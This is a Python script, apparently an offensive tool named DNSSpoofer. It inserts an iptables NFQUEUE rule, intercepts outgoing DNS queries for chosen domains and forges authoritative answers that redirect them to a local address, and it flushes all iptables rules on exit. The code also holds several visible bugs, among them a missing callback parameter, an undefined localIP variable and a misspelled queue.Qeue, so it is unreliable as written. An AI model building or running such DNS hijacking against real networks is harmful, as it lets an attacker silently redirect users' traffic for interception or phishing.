#!/usr/bin/env python3

__author__ = 'foxtrot_charlie'
__licence__ = 'GPLv2'


import queue
from scapy.all import *
from netfilterqueue import NetfilterQueue


logger = logging.getLogger("DNSSPOOFER")
logger.setLevel(logging.DEBUG)
fh = logging.FileHandler('dnsdeceiver.log')
formatter = logging.Formatter("%(name)s; %(asctime)s; %(levelname)s; %(message)s", "%Y-%m-%d %H:%M:%S")
fh.setFormatter(formatter)
logger.addHandler(fh)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


_iptablesr_ = "iptables -A OUTPUT -j NFQUEUE"


class DNSSpoofer(threading.Thread):
    def __init__(self, event, queue, config={}):
        threading.Thread.__init__(self)
        self.event = event
        logger.debug('Inserting iptables rules: {}'.format(_iptablesr_))
        try:
            os.system(_iptablesr_)
        except OSError:
            logger.critical('Cannot execute iptables rulse!')
            sys.exit(-1)
        self.queue = queue
        self.spoofaddr = {} # should be thread safe - like all built-in types

    def callback(self):
        if self.event.is_set():
            raise KeyboardInterrupt # really awful

        payload = packet.get_payload()
        pkt = IP(payload)

        if not pkt.haslayer(DNSQR):
            packet.accept()
            # TODO - edit packet if needed
        else:
            if pkt[DNS].qd.qname in self.spoofaddr:
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                              DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                                  an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=localIP))
                packet.set_payload(str(spoofed_pkt))
                packet.accept()
            else:
                packet.accept()

    def configurator(self):
        while not self.event.is_set():
            while not self.queue.empty():
                cmd = self.queue.get()
                self.__execute_cmd(cmd)

    def __execute_cmd(self, cmd):
        if len(cmd) == 0:
            pass

        if len(cmd) == 1:
            pass

        if len(cmd) == 2:
            if cmd[0] == 'r':
                target = cmd[1]
                if target in self.spoofaddr.keys():
                    self.spoofaddr.__delattr__(target)
                else:
                    logger.warning('Cannot find target: {}, omitting'.format(target))

        if len(cmd) == 3:
            if cmd[0] == 'a':
                self.spoofaddr[cmd[1]] = cmd[2]


    def run(self):
        # This is the intercept
        q = NetfilterQueue()
        q.bind(1, self.callback)
        try:
            q.run()  # Main loop
        except KeyboardInterrupt:
            q.unbind()

    def __del__(self):
        try:
            os.system('iptables -F')
            os.system('iptables -X')
        except OSError:
            logger.critical('Cannot revert iptables rules!')
            sys.exit(-1)

if __name__ == '__main__':
    q = queue.Qeue()
    e = threading.Event()
    dnss =DNSSpoofer(event=e, queue=q)
    dnss.run()